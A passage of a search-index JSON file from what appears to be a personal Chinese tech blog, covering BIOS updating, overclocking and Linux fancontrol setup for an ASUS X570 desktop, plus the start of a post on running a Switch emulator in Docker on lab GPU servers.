Flash\u5219\u662f\u5728BIOS\u4e2d\uff0c\u800c\u4e0d\u7528\u8fdb\u5165\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u66f4\u65b0BIOS\u3002[Motherboard/Desktop] \u534e\u7855\u4e3b\u677f\u5982\u4f55\u901a\u8fc7EZ Flash\u66f4\u65b0BIOS | \u5b98\u65b9\u652f\u6301 | ASUS \u4e2d\u56fd</p> <ul> <li>\u5728\u4f7f\u7528USB\u00a0BIOS FlashBack\u2122\u5de5\u5177\u4e4b\u524d\uff0c\u8bf7\u5173\u673a\uff0c\u4f46\u7535\u6e90\u52ff\u62d4\u9664\u3002</li> <li>\u6309\u4f4fBIOS\u00a0FlashBack\u2122\u6309\u94ae3\u79d2\u949f\uff0c\u76f4\u5230Flashback\u6307\u793a\u706f\u95ea\u70c1\u4e09\u6b21\u540e\uff0c\u4ee3\u8868BIOS\u00a0FlashBack\u2122\u00a0\u529f\u80fd\u5df2\u7ecf\u5f00\u59cb\u6267\u884c\u3002<ul> <li>*BIOS\u6863\u6848\u5927\u5c0f\u4f1a\u5f71\u54cd\u66f4\u65b0\u65f6\u95f4\uff0c\u9884\u4f30\u53ef\u57288\u5206\u949f\u5185\u5b8c\u6210\u3002\u6267\u884c\u8fc7\u7a0b\u4e2d\u8bf7\u52ff\u79fb\u9664U\u76d8\u3001\u7535\u6e90\u62d4\u9664\u3001\u5f00\u673a\u6216\u6309\u4e0bCLR_CMOS\u6309\u94ae\uff0c\u8fd9\u6837\u4f1a\u5bfc\u81f4\u66f4\u65b0\u4e2d\u65ad\uff0c\u9020\u6210\u65e0\u6cd5\u5f00\u673a\u73b0\u8c61\u3002</li> </ul> </li> <li>\u7b49\u5f85\u76f4\u5230\u6307\u793a\u706f\u7184\u706d\uff0c\u4ee3\u8868\u4e3b\u677f\u7684BIOS\u5df2\u7ecf\u66f4\u65b0\u5b8c\u6210\u3002</li> </ul>","tags":["raid10","x570","\u4e8c\u624b\u786c\u76d8","\u88c5\u673a"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/04/05/%E5%8F%B0%E5%BC%8F%E6%9C%BA%E5%8D%87%E7%BA%A7-%E7%A1%AC%E4%BB%B6%E7%AF%87/#\u6700\u5c11\u5916\u63a5\u8bbe\u5907\u6d4b\u8bd5\u5f00\u673a","title":"\u6700\u5c11\u5916\u63a5\u8bbe\u5907\u6d4b\u8bd5\u5f00\u673a","text":"<p>\u8bf7\u6309\u7167\u5982\u4e0b\u8bf4\u660e\u79fb\u9664\u6240\u6709\u7684\u5916\u63a5\u8bbe\u5907\u5e76\u518d\u6b21\u786e\u8ba4\u3002</p> <ul> <li>a. \u4fdd\u7559\u63a5\u5728\u4e3b\u677f\u4e0a\u7684CPU, CPU\u6563\u70ed\u98ce\u6247\u548c\u4e00\u6839\u5185\u5b58\u3002</li> <li>b. \u4ece\u4e3b\u677f\u4e0a\u79fb\u9664\u6240\u6709\u7684USB\u8bbe\u5907\u548c\u5916\u63a5\u5361\uff0c\u5305\u62ec\u9f20\u6807\uff0c\u952e\u76d8\uff0cUSB\u968f\u8eab\u789f\uff0c\u56fa\u6001\u786c\u76d8\uff0c\u5916\u63a5PCI-E\u5361\u7b49\u7b49\u3002</li> <li>c. \u79fb\u9664\u8fde\u63a5\u5230\u4e3b\u677f\u4e0a\u7684\u6240\u6709\u7ebf\uff0c\u5305\u62ec\u7f51\u7ebf\uff0c\u97f3\u9891\u7ebf\uff0c\u53ea\u7559\u4e0b\u663e\u793a\u7ebf\u6765\u786e\u4fdd\u663e\u793a\u3002</li> <li>d. \u7136\u540e\u5c1d\u8bd5\u5f00\u542f\u8ba1\u7b97\u673a\uff0c\u5982\u679c\u53ef\u4ee5\u6b63\u5e38\u5f00\u673a\uff0c\u4e5f\u8bb8\u95ee\u9898\u6765\u6e90\u4e8e\u88ab\u79fb\u9664\u7684\u5916\u63a5\u8bbe\u5907\u6216\u7ebf\u6750\u3002\u9010\u4e00\u5c1d\u8bd5\u63d2\u5165\u5916\u63a5\u8bbe\u5907\u6216\u7ebf\u6750\uff0c\u76f4\u5230\u4f60\u53d1\u73b0\u54ea\u4e2a\u5916\u63a5\u8bbe\u5907\u6216\u7ebf\u6750\u5f15\u8d77\u8fd9\u4e2a\u95ee\u9898\u3002</li> </ul>","tags":["raid10","x570","\u4e8c\u624b\u786c\u76d8","\u88c5\u673a"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/04/05/%E5%8F%B0%E5%BC%8F%E6%9C%BA%E5%8D%87%E7%BA%A7-%E7%A1%AC%E4%BB%B6%E7%AF%87/#\u9047\u5230\u7684\u95ee\u9898","title":"\u9047\u5230\u7684\u95ee\u9898","text":"<p>\u4e70\u6765\u7684 x570 \u5f00\u673a\u540e\uff0c\u663e\u793aQ-LED \u663e\u793a\u6a59\u706f\uff0c\u5bf9\u5e94DRAM\u3002Q-Code LED\u663e\u793a 0x0d</p> <p>ASUS Rog Strix X570-E code 0d help : r/pcmasterrace (reddit.com)</p> <ul> <li>\u5c1d\u8bd5\u6362\u5355\u6839\u63d2\u62d4\u5185\u5b58\u6761\u4e0d\u884c</li> <li>\u5c1d\u8bd5\u6e05\u9664CMOS\u4e0d\u884c\uff08\u8bd5\u4e86\u77ed\u63a5\u8df3\u7ebf\uff0c\u548c\u6263\u7535\u6c6010\u5206\u949f\u65b9\u6cd5\uff09</li> <li>\u4f7f\u7528U\u76d8\u91cd\u65b0\u5237\u5199BIOS\u5c31\u597d\u4e86</li> </ul>","tags":["raid10","x570","\u4e8c\u624b\u786c\u76d8","\u88c5\u673a"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/04/05/%E5%8F%B0%E5%BC%8F%E6%9C%BA%E5%8D%87%E7%BA%A7-%E7%A1%AC%E4%BB%B6%E7%AF%87/#\u8c03\u6574","title":"\u8c03\u6574","text":"","tags":["raid10","x570","\u4e8c\u624b\u786c\u76d8","\u88c5\u673a"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/04/05/%E5%8F%B0%E5%BC%8F%E6%9C%BA%E5%8D%87%E7%BA%A7-%E7%A1%AC%E4%BB%B6%E7%AF%87/#bios\u53c2\u6570","title":"BIOS\u53c2\u6570","text":"","tags":["raid10","x570","\u4e8c\u624b\u786c\u76d8","\u88c5\u673a"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/04/05/%E5%8F%B0%E5%BC%8F%E6%9C%BA%E5%8D%87%E7%BA%A7-%E7%A1%AC%E4%BB%B6%E7%AF%87/#summary","title":"Summary","text":"<p>\u964d\u538b\u8d85\u9891Curve Optimizer: </p> <ul> <li>all cores</li> <li>All core curve optimizer sign: negative</li> <li>All core curve optimizer magnitude: 30\uff08\u9002\u7528\u4e8e5800x\uff0c\u4e0d\u540ccpu\u4e0d\u4e00\u6837\uff09</li> </ul> <p>Memory Frequency: DDR4-2666MHz\uff08\u53ef\u4ee5\u5f88\u5bb9\u6613\u8d85\u5230 3200MHz\uff09\u3002\u4f46\u662f\u81ea\u52a8\u5374\u7ed9\u6211\u534f\u5546\u5230 2400Mhz</p> <p>Advanced\\APM Configuration</p> <ul> <li>Restore AC Power Loss: Power On</li> <li>Power On By PCI-E: Enabled</li> </ul> <p>\u865a\u62df\u5316\u76f8\u5173</p> <ul> <li>SVM Mode: enabled</li> <li>IOMMU: Enabled</li> <li>Advanced\\PCI subsystem Settings<ul> <li>Above 4G Decoding: Enabled</li> <li>Resize BAR Support: Auto</li> <li>SR-IOV Support: Enabled</li> </ul> </li> </ul>","tags":["raid10","x570","\u4e8c\u624b\u786c\u76d8","\u88c5\u673a"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/04/05/%E5%8F%B0%E5%BC%8F%E6%9C%BA%E5%8D%87%E7%BA%A7-%E7%A1%AC%E4%BB%B6%E7%AF%87/#pbo-\u76f8\u5173","title":"PBO \u76f8\u5173","text":"<p>PBO2</p> <p>Ai Tweaker</p> <p>Target CPU Speed: 3800MHz Target DRAM Frequency: 2666MHz Target FCLK Frequency: 1333MHz</p> <ul> <li>Ai Overclock Tuner: Select the target CPU frequency, and the relevant parameters will be auto-adjusted. When you install XMP memory modules, We provide you the optimal frequency to ensure the system stablility; For higer-freq alternatives, you may find the related settings under <code>[Memory Frequency]</code> item.<ul> <li>Auto</li> <li>Manual</li> <li>D.O.C.P<ul> <li>DDR4-2667 19-19-19-43-1.20 V</li> </ul> </li> </ul> </li> <li>BCLK Frequency</li> <li>SB Clock Spread Spectrum: Enable/Disable CG1_PLL Spread Spectrum</li> <li>Performance Enhancer: Allows the CPU to maintain boost freqencies longer, resulting in higher performance</li> <li>FCLK Frequency: Auto, 800MHz,3000Mhz, step 1333Mhz</li> <li>Memory Frequency: Forces a DDR4 frequency slower than the common tCK detected via SPD</li> <li>CPU Core Ratio (/Per CCX)</li> <li>TPU: The TPU automatically overclocks the frequency and voltage of the CPU to enhance the system performance<ul> <li>Keep Current Settings without changing anything</li> <li>TPU I, II</li> </ul> </li> <li>Performance Bias: different values may help different software's performance<ul> <li>Auto, None</li> <li>CBR15 Gentle, Aida/Geekbench, CBR15 Aggressive</li> </ul> </li> <li>Precision Boost Overdrive<ul> <li>PBO Fmax Enhancer: Auto, Enabled, Disabled</li> <li>Precision Boost Overdrive: Auto, Diskabled, Enabled, Manual<ul> <li>Manual<ul> <li>PPT Limit: (Watt)</li> <li>TDC Limit</li> <li>EDC Limit</li> </ul> </li> <li>Enabled\uff1a\u611f\u89c9\u6bd4 Auto \u6027\u80fd\u6709\u6240\u63d0\u5347</li> </ul> </li> <li>PBO Scalar: Auto, Manual<ul> <li>Manual: Customized Precision Boost Overdrive Scalar: 1-10 x</li> </ul> </li> <li>Curve Optimizer: <ul> <li>all cores</li> <li>All core curve optimizer sign: negative</li> <li>All core curve optimizer magnitude: 30\uff08\u9002\u7528\u4e8e5800x\uff0c\u4e0d\u540ccpu\u4e0d\u4e00\u6837\uff09</li> </ul> </li> <li>Platform Thermal Throttle Limit: Auto, Manual<ul> <li>Manual, \u586b\u6570\u5b57</li> </ul> </li> </ul> </li> <li>DRAM Timing Control &gt;</li> <li>DIGI+ VRAM</li> <li>VDDCR CPU Voltage: 1.456V<ul> <li>Manual</li> <li>Offset mode<ul> <li>Sign</li> <li>Voltage</li> </ul> </li> <li>VDDCR SOC Voltage: 0.975V</li> <li>DRAM Voltage: 1.2V</li> </ul> </li> </ul> <p>Boot \u76f8\u5173</p> <ul> <li>Boot/CSM: \u5f00\u542f Above Resize BAR \u9700\u8981\u5173\u95ed<ul> <li>Enable to support the non-UEFI driver add-on devices or the Windows UEFI mode</li> <li>Disable to fully support the Windows secure update and secure boot</li> </ul> </li> <li>Fast Boot: enables or disables boot with initialization of a minimal set of devices required to launch active boot option. Has no effect for BBS boot options<ul> <li>Next Boot after AC Power Loss\uff0c\u9ed8\u8ba4 Normal Boot</li> </ul> </li> <li>Bootup NumLock State\uff1a\u8fd9\u4e5f\u662f\u4e3a\u4ec0\u4e48\u8ba1\u7b97\u673a\u6b63\u5e38\u5f00\u673a\u53ef\u4ee5\u901a\u8fc7\u89c2\u5bdf\u952e\u76d8 NumLock \u72b6\u6001\u77e5\u9053</li> </ul>","tags":["raid10","x570","\u4e8c\u624b\u786c\u76d8","\u88c5\u673a"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/04/05/%E5%8F%B0%E5%BC%8F%E6%9C%BA%E5%8D%87%E7%BA%A7-%E7%A1%AC%E4%BB%B6%E7%AF%87/#\u673a\u7bb1\u98ce\u6247\u592a\u5435","title":"\u673a\u7bb1\u98ce\u6247\u592a\u5435","text":"<ul> <li>CPU\u53cc\u5854\u6563\u70ed\u5668\u4e24\u4e2a\u98ce\u6247\u901a\u8fc72\u5408\u4e00\u7ebf\u8fde\u63a5\u5728CPU_FAN\u4e0a\uff08CPU_OPT\u6ca1\u6709\u4f7f\u7528\uff09</li> <li>\u673a\u7bb1\u9876\u90e8\u4e24\u4e2a\u767d\u8272\u98ce\u6247\u548c\u524d\u9762\u677f\u4e09\u4e2a\u98ce\u6247\u88c5\u5728 AIO_PUMP\u4e0a\uff08\u4e3b\u8981\u566a\u97f3\u6765\u6e90\uff09</li> <li>\u5c3e\u90e8\u98ce\u6247\u63a5\u5728 CHA_FAN1\uff0c\u6240\u4ee5CHA_FAN2\uff08\u4e09\u4e2a\uff09\u6ca1\u6709\u4f7f\u7528</li> </ul> <p>CHA_FAN\u542b\u4e49</p> <p>CHA\u662fchassis\u7684\u7f29\u5199\uff0c\u8868\u793a\u673a\u7bb1\u3002\u5408\u8d77\u6765\u5373\u8868\u793a\u673a\u7bb1\u98ce\u6247</p> <p>\u5728\u4e3b\u677fBIOS\u4e2d\u8c03\u6574\u98ce\u6247\u66f2\u7ebf\u5373\u53ef\uff08\u7b80\u5355\u6a21\u5f0fEZ Mode\u9996\u9875\u5c31\u80fd\u770b\u5230QFAN Control\uff09\u3002</p> <p>\u8fd4\u73b0\u539f\u56e0\u662f\u63d2\u5728 AIO_PUMP \u4e0a\u7684\u98ce\u6247\u9ed8\u8ba4\u662f\u6ee1\u901f\u7684 </p>","tags":["raid10","x570","\u4e8c\u624b\u786c\u76d8","\u88c5\u673a"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/04/05/%E5%8F%B0%E5%BC%8F%E6%9C%BA%E5%8D%87%E7%BA%A7-%E7%A1%AC%E4%BB%B6%E7%AF%87/#\u5bf9\u5e94-fanctrl","title":"\u5bf9\u5e94 fanctrl","text":"<p>linux \u4e0b\u53ef\u4ee5\u901a\u8fc7 fanctrl \u8c03\u8282\u98ce\u6247\u901f\u5ea6</p> <p>glances \u4e2d\u770b\u5230\u7684 nct6798 1-6 \u5bf9\u5e94 hwmon2/pwmX\uff0c \u914d\u7f6e\u6587\u4ef6\u793a\u4f8b\u3002</p> <ul> <li>\u4e3b\u8981\u9700\u8981\u77e5\u9053\u63a7\u5236\u98ce\u6247\u7684\u8bbe\u5907\uff08\u5982 nct6798\uff09\u4f4d\u4e8e hwmonX \u591a\u5c11\u3002\u8fd9\u4e2a\u66f4\u6539\u4e86\u786c\u4ef6\uff0c\u6bd4\u5982\u63d2\u5165\u4e00\u4e2a pcie \u7684 sata \u6269\u5c55\u5361\uff0c\u53ef\u80fd\u4f1a\u5bfc\u81f4\u53d8\u5316\u3002\u6bd4\u5982\u4ece hwmon2 \u53d8\u4e3a hwmon4\u3002 <pre><code>$ pwmconfig\nFound the following devices:\n   hwmon0 is nvme\n   hwmon1 is nvme\n   hwmon2 is asus\n   hwmon3 is asusec\n   hwmon4 is nct6798\n</code></pre></li> <li>\u7b2c\u4e8c\u5c31\u662f\u77e5\u9053 CPU FAN\uff0c\u673a\u7bb1 FAN\uff0c\u6c34\u51b7 FAN \u5bf9\u5e94 pwmX, \u548c fanX_input\u3002\u524d\u8005\u662f output\uff0c\u63a7\u5236\u98ce\u6247\u8f6c\u901f\uff0c\u540e\u8005\u662f\u8f93\u5165\uff0c\u4ece\u4e2d\u53ef\u4ee5\u8bfb\u53d6\u5230\u98ce\u6247\u8f6c\u901f\u3002</li> <li>\u6700\u540e\u662f\u77e5\u9053\u6839\u636e\u4ec0\u4e48\u4f20\u611f\u5668\u7684\u6e29\u5ea6\u8fdb\u884c\u63a7\u5236\uff0c\u793a\u4f8b\u4e2d\u4f7f\u7528\u7684\u662f hwmon3/temp2_input\u3002\u77e5\u9053\u7f16\u53f7\u7684\u65b9\u5f0f\u662f\uff0c\u8fd0\u884c <code>pwmconfig</code>\uff0c\u5b83\u5728\u786e\u5b9a\u4e86\u4e0a\u4e24\u6b65\u540e\uff0c\u4f1a\u8ba9\u4f60\u914d\u7f6e\u6bcf\u4e2a\u98ce\u6247\uff0c\u6b64\u65f6\u4f1a\u663e\u793a\u6240\u6709\u4f20\u611f\u5668\u5f53\u524d\u7684\u6570\u503c\u3002\u6839\u636e\u8fd9\u4e9b\u6570\u5b57\u548c glances \u4e2d\u5bf9\u5e94\uff08\u6bd4\u5982 AMD \u7684\u6e29\u5ea6\u53ef\u80fd\u662f ccd, cctrl\uff09</li> </ul> <pre><code>INTERVAL=10\nDEVPATH=hwmon2=devices/platform/nct6775.656 hwmon3=devices/platform/asus-ec-sensors\nDEVNAME=hwmon2=nct6798 hwmon3=asusec\nFCTEMPS=hwmon2/pwm5=hwmon3/temp2_input hwmon2/pwm1=hwmon3/temp2_input hwmon2/pwm2=hwmon3/temp2_input\n#\nFCFANS= hwmon2/pwm5=hwmon2/fan5_input hwmon2/pwm1=hwmon2/fan1_input hwmon2/pwm2=hwmon2/fan2_input\n\n#MINTEMP=hwmon2/pwm5=40 hwmon2/pwm1=40 hwmon2/pwm2=40\nMINTEMP=hwmon2/pwm5=45 hwmon2/pwm1=45 hwmon2/pwm2=45\n#MAXTEMP=hwmon2/pwm5=60 hwmon2/pwm1=60 hwmon2/pwm2=70\nMAXTEMP=hwmon2/pwm5=95 hwmon2/pwm1=95 hwmon2/pwm2=95\n\nMINSTART=hwmon2/pwm5=36 hwmon2/pwm1=36 hwmon2/pwm2=36\nMINSTOP=hwmon2/pwm5=60 hwmon2/pwm1=60 hwmon2/pwm2=60\n\n#MAXPWM=hwmon2/pwm5=120 hwmon2/pwm1=150 hwmon2/pwm2=255\nMAXPWM=hwmon2/pwm5=255 hwmon2/pwm1=255 hwmon2/pwm2=255\n</code></pre> <p>\u8f6c\u901f\u8c03\u8282</p> <ul> <li>\u98ce\u6247\u4f4e\u4e8e 1000 \u8f6c\uff0c\u57fa\u672c\u4e0a\u58f0\u97f3\u90fd\u5f88\u5c0f</li> <li>MINPWN \u8868\u793a\u98ce\u6247\u7684\u505c\u8f6c pwm</li> <li>MAXPWM \u6700\u597d\u4e0d\u8981\u4fee\u6539\uff0c\u9ed8\u8ba4 255 \u5373\u53ef\u3002\u5426\u5219\u9047\u5230\u8d1f\u8f7d\u5f88\u5927\uff0c\u53ef\u80fd\u5bfc\u81f4\u89e3\u70ed\u80fd\u529b\u4e0d\u591f\uff08\u9047\u5230\u8fc7\u4e00\u6b21\u6e29\u5ea6\u8fc7\u9ad8\u7535\u8111\u91cd\u542f\u8fdb\u5165 BIOS \u60c5\u51b5\uff09</li> <li>\u8c03\u8282 MINTEMP \u548c MINSTOP \u5373\u53ef\u3002\u7b80\u5355\u8d77\u89c1\uff0c\u53ef\u4ee5\u628a MINPWM\uff08MINSTART\uff09\u548cMINSTOP \u8bbe\u7f6e\u6210\u4e00\u6837\u7684\uff0c\u8bbe\u7f6e\u6210\u4e00\u4e2a\u566a\u97f3\u6bd4\u8f83\u5c0f\u7684\u6c34\u5e73\u5373\u53ef\u3002 <pre><code>    PWM ^\n    255 +\n        |\n        |\n        |                             ,-------------- MAXPWM\n        |                           ,'.\n        |                         ,'  .\n        |                       ,'    .\n        |                     ,'      .\n        |                   ,'        .\n        |                 ,'          .\n        |       MINSTOP .'            .\n        |               |             .\n        |               |             .\n        |               |             .\n   MINPWM |---------------'             .\n        |               .             .\n        |               .             .\n        |               .             .\n      0 +---------------+-------------+----------------&gt;\n                     MINTEMP       MAXTEMP            t (degree C)\n</code></pre></li> </ul>","tags":["raid10","x570","\u4e8c\u624b\u786c\u76d8","\u88c5\u673a"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/04/05/%E5%8F%B0%E5%BC%8F%E6%9C%BA%E5%8D%87%E7%BA%A7-%E7%A1%AC%E4%BB%B6%E7%AF%87/#hwmon-\u4f1a\u53d1\u751f\u53d8\u5316","title":"hwmon \u4f1a\u53d1\u751f\u53d8\u5316","text":"<p>\u9047\u5230 fancontrol \u670d\u52a1\u62a5\u9519 <pre><code>Oct 27 16:48:31 ryzen-pve fancontrol[19734]: Device path of hwmon2 has changed\nOct 27 16:48:31 ryzen-pve fancontrol[19734]: Device name of hwmon2 has changed\nOct 27 16:48:31 ryzen-pve fancontrol[19734]: Configuration appears to be outdated, please run pwmconfig again\n</code></pre></p> <p>\u73b0\u5728\u786e\u5b9e\u53d8\u6210 hwmon4 \u4e86 <pre><code>Found the following devices:\n   hwmon0 is nvme\n   hwmon1 is nvme\n   hwmon2 is asus\n   hwmon3 is asusec\n   hwmon4 is nct6798\n\nFound the following PWM controls:\n   hwmon4/pwm1           current value: 255\n   hwmon4/pwm2           current value: 255\n   hwmon4/pwm3           current value: 255\n   hwmon4/pwm4           current value: 255\n   hwmon4/pwm5           current value: 255\n   hwmon4/pwm6           current value: 255\n\nGiving the fans some time to reach full speed...\nFound the following fan sensors:\n   hwmon3/fan1_input     current speed: 3101 RPM\n   hwmon4/fan1_input     current speed: 1872 RPM\n   hwmon4/fan2_input     current speed: 1558 RPM\n   hwmon4/fan3_input     current speed: 0 ... skipping!\n   hwmon4/fan4_input     current speed: 0 ... skipping!\n   hwmon4/fan5_input     current speed: 1614 RPM\n   hwmon4/fan6_input     current speed: 0 ... skipping!\n</code></pre></p> <pre><code>It appears that fan hwmon4/fan1_input\n    is controlled by pwm hwmon4/pwm1\nWould you like to generate a detailed correlation (y)?\n\n    PWM 255 FAN 1846\n    PWM 240 FAN 1797\n    PWM 225 FAN 1728\n    PWM 210 FAN 1650\n    PWM 195 FAN 1573\n    PWM 180 FAN 1500\n    PWM 165 FAN 1388\n    PWM 150 FAN 1308\n    PWM 135 FAN 1198\n    PWM 120 FAN 1112\n    PWM 105 FAN 976\n    PWM 90 FAN 880\n    PWM 75 FAN 751\n    PWM 60 FAN 694\n    PWM 45 FAN 687\n    PWM 30 FAN 685\n    PWM 28 FAN 685\n    PWM 26 FAN 684\n    PWM 24 FAN 686\n    PWM 22 FAN 686\n    PWM 20 FAN 686\n    PWM 18 FAN 685\n    PWM 16 FAN 684\n    PWM 14 FAN 685\n    PWM 12 FAN 685\n    PWM 10 FAN 685\n    PWM 8 FAN 683\n    PWM 6 FAN 683\n    PWM 4 FAN 686\n    PWM 2 FAN 684\n    PWM 0 FAN 682\n\nIt appears that fan hwmon4/fan2_input\n    is controlled by pwm hwmon4/pwm2\nWould you like to generate a detailed correlation (y)?\n    PWM 255 FAN 1551\n    PWM 240 FAN 1496\n    PWM 225 FAN 1433\n    PWM 210 FAN 1377\n    PWM 195 FAN 1300\n    PWM 180 FAN 1267\n    PWM 165 FAN 1212\n    PWM 150 FAN 1136\n    PWM 135 FAN 1086\n    PWM 120 FAN 1023\n    PWM 105 FAN 951\n    PWM 90 FAN 904\n    PWM 75 FAN 836\n    PWM 60 FAN 750\n    PWM 45 FAN 683\n    PWM 30 FAN 605\n    PWM 28 FAN 580\n    PWM 26 FAN 558\n    PWM 24 FAN 549\n    PWM 22 FAN 538\n    PWM 20 FAN 524\n    PWM 18 FAN 508\n    PWM 16 FAN 504\n    PWM 14 FAN 486\n    PWM 12 FAN 478\n    PWM 10 FAN 458\n    PWM 8 FAN 448\n    PWM 6 FAN 436\n    PWM 4 FAN 425\n    PWM 2 FAN 409\n    PWM 0 FAN 389\n\n# \u6700\u5435\u7684\nIt appears that fan hwmon4/fan5_input\n    is controlled by pwm hwmon4/pwm5\nWould you like to generate a detailed correlation (y)?\n    PWM 255 FAN 1582\n    PWM 240 FAN 1551\n    PWM 225 FAN 1493\n    PWM 210 FAN 1398\n    PWM 195 FAN 1335\n    PWM 180 FAN 1275\n    PWM 165 FAN 1201\n    PWM 150 FAN 1150\n    PWM 135 FAN 1073\n    PWM 120 FAN 993\n    PWM 105 FAN 893\n    PWM 90 FAN 796\n    PWM 75 FAN 680\n    PWM 60 FAN 579\n    PWM 45 FAN 448\n    PWM 30 FAN 318\n    PWM 28 FAN 245\n    PWM 26 FAN 224\n    PWM 24 FAN 194\n    PWM 22 FAN 0\n    Fan Stopped at PWM = 22\n</code></pre>","tags":["raid10","x570","\u4e8c\u624b\u786c\u76d8","\u88c5\u673a"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/04/05/%E5%8F%B0%E5%BC%8F%E6%9C%BA%E5%8D%87%E7%BA%A7-%E7%A1%AC%E4%BB%B6%E7%AF%87/#chipset\u6e29\u5ea669\u6444\u6c0f\u5ea6","title":"chipset\u6e29\u5ea669\u6444\u6c0f\u5ea6","text":"<p>chipset \u6e29\u5ea6\u57fa\u672c\u4e00\u76f4\u7ef4\u6301\u572869 \u5ea6\u3002\u89c2\u5bdf\u4f20\u611f\u5668\u6570\u636e\uff0cChipset \u98ce\u6247\u8c8c\u4f3c\u4e00\u76f4\u662f\u4e00\u4e2a\u6ee1\u8f6c\u7684\u72b6\u6001 3149R\uff0c\u4e0d\u8fc7\u5e76\u6ca1\u6709\u566a\u97f3\u3002</p> <p>\u4e86\u89e3\u5230\u662f\u6b63\u5e38\u73b0\u8c61 What are normal X570 chipset temperatures? : r/Amd (reddit.com)</p> <p>chipset\u98ce\u6247</p> <p>chipset\u4e5f\u6709\u98ce\u6247\uff0c\u63a5\u57284pin PCH_FAN \u4e0a </p>","tags":["raid10","x570","\u4e8c\u624b\u786c\u76d8","\u88c5\u673a"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/24/%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E8%BF%90%E8%A1%8Cswitch%E6%A8%A1%E6%8B%9F%E5%99%A8/","title":"\u670d\u52a1\u5668\u4e0a\u8fd0\u884cswitch\u6a21\u62df\u5668\uff08linux \u4e91\u6e38\u620f\uff09","text":"<p>\u670d\u52a1\u5668\u6709\u4e00\u4e9b\u8001\u8ba1\u7b97\u5361\u5982 P40\uff0cTitanV \u90fd\u662f\u6709\u56fe\u5f62\u80fd\u529b\u7684\uff0c\u5e76\u4e14\u8c8c\u4f3c\u6027\u80fd\u8fd8\u4e0d\u9519\uff08\u6bd4\u5982 TitanV \u6709 3070 \u7684\u6027\u80fd\uff09\u3002\u8fd8\u6709\u4e00\u4e9b\u8001\u5361\u5982 1080Ti \u5f88\u5c11\u6709\u4eba\u7528\uff0c\u95f2\u7f6e\u592a\u6d6a\u8d39\u4e86\u3002</p> <p>\u56e0\u6b64\u672c\u7740\u79d1\u5b66\u6c42\u5b9e\u7684\u7cbe\u795e\uff0c\u60f3\u63a2\u7a76\u4e0b\u5b9e\u9a8c\u5ba4\u8fd9\u4e9b\u5361\u7684\u6027\u80fd\u6c34\u5e73\uff0c\u4e3a\u4e4b\u540e\u79d1\u7814\u505a\u94fa\u57ab\u3002\u3002\u3002\u597d\u5427\uff0c\u6211\u7f16\u4e0d\u4e0b\u53bb\u4e86\uff0c\u5c31\u662f\u60f3\u767d\u5ad6\u5b9e\u9a8c\u5ba4\u663e\u5361\u73a9\u6e38\u620f\u3002\u52a0\u4e0a\u6700\u8fd1\u585e\u5c14\u8fbe\u738b\u56fd\u4e4b\u6cea\u51fa\u4e86\uff0c\u4e4b\u524d\u6361\u5783\u573e\u65f6\uff0c\u89c1\u8fc7\u7528 P106 \u8fd9\u79cd 100 \u5757\u7684 \u201c1060\u201d linux \u4e0b\u73a9 switch \u6a21\u62df\u5668\u6548\u679c\u4e0d\u9519\u3002\u800c\u81ea\u5df1\u7684\u663e\u5361 rx550 \u6839\u672c\u5e26\u4e0d\u52a8\uff0c\u6d41\u4e0b\u4e86\u6ca1\u94b1\u4e70\u5361\u7684\u6cea\u6c34\u3002</p> <p>\u58f0\u660e</p> <ul> <li>\u6240\u6709\u914d\u7f6e\u90fd\u662f\u5728 docker \u7b49\u9694\u79bb\u7684\u865a\u62df\u5316\u73af\u5883\u4e2d\uff0c\u4e0d\u4f1a\u5bf9\u7cfb\u7edf\u73af\u5883\u9020\u6210\u6c61\u67d3\uff0c\u5f71\u54cd\u5176\u5b83\u4eba\u4f7f\u7528</li> <li>\u53ea\u5728\u4f7f\u7528\u4eba\u6570\u4e0d\u591a\u7684\u673a\u5668\u4e0a\u5b9e\u9a8c\uff0c\u4e0d\u4f1a\u5728 A100 \u7b49\u4e3b\u529b\u673a\u5668\u4e0a\u5b9e\u9a8c</li> <li>\u53ea\u5728\u6ca1\u4eba\u7528\u65f6\u5b9e\u9a8c</li> </ul> <p>\u6548\u679c</p> <ul> <li>docker gow</li> </ul> <p> </p> <p></p> <p></p> <p>wolf \u5373\u63d2\u5373\u7528\u6548\u679c</p> <p></p> <p></p>","tags":["wolf","gow","linux","gaming","docker","\u865a\u62df\u6e38\u620f\u623f"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/24/%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E8%BF%90%E8%A1%8Cswitch%E6%A8%A1%E6%8B%9F%E5%99%A8/#\u8ba1\u7b97\u5361\u6027\u80fd\u5bf9\u6bd4","title":"\u201c\u8ba1\u7b97\u5361\u201d\u6027\u80fd\u5bf9\u6bd4","text":"<p>NVIDIA Tesla P40 Specs | TechPowerUp GPU Database NVIDIA Tesla P100 PCIe 16 GB Specs | TechPowerUp GPU Database</p> <p> </p> <p>P100(0.84)&lt; 1080 Ti(1) &lt; P40(1.04) &lt; Titan V(1.32) &lt; 3070Ti(1.46)</p>","tags":["wolf","gow","linux","gaming","docker","\u865a\u62df\u6e38\u620f\u623f"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/24/%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E8%BF%90%E8%A1%8Cswitch%E6%A8%A1%E6%8B%9F%E5%99%A8/#lxd-\u865a\u62df\u673a\u65b9\u6848\u4e0d\u7528\u4e86","title":"LXD 